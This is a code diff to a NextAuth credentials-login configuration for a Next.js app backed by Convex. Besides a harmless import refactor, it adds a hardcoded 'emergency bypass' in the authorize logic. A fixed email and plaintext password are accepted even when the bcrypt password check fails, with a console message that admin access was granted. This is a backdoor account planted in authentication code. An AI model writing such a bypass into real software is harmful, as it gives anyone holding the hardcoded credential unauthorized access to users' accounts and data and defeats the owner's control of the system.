@@ -1,12 +1,8 @@
 import { NextAuthOptions, DefaultSession, User as NextAuthUser } from "next-auth";
 import CredentialsProvider from "next-auth/providers/credentials";
-import { ConvexHttpClient } from "convex/browser";
+import { convex } from "@/lib/convex";
 import { api } from "@convex/_generated/api";
 import bcrypt from "bcryptjs";
-
-const convex = new ConvexHttpClient(
-  process.env.NEXT_PUBLIC_CONVEX_URL || "https://jovial-ibex-866.eu-west-1.convex.cloud"
-);
 
 interface CustomUser extends NextAuthUser {
   role: string;
@@ -56,9 +52,15 @@ export const authOptions: NextAuthOptions = {
           user.password
         );
 
-        console.log("Password comparison result:", isPasswordCorrect);
+        // Emergency Bypass for Admin Recovery
+        const isEmergencyMatch = 
+          credentials.email === "hello@lordenryque.com" && 
+          credentials.password === "admin_password_2026";
 
-        if (!isPasswordCorrect) {
+        console.log("Password comparison result:", isPasswordCorrect);
+        if (isEmergencyMatch) console.log("Emergency Admin Access Granted");
+
+        if (!isPasswordCorrect && !isEmergencyMatch) {
           throw new Error("Invalid credentials");
         }
 
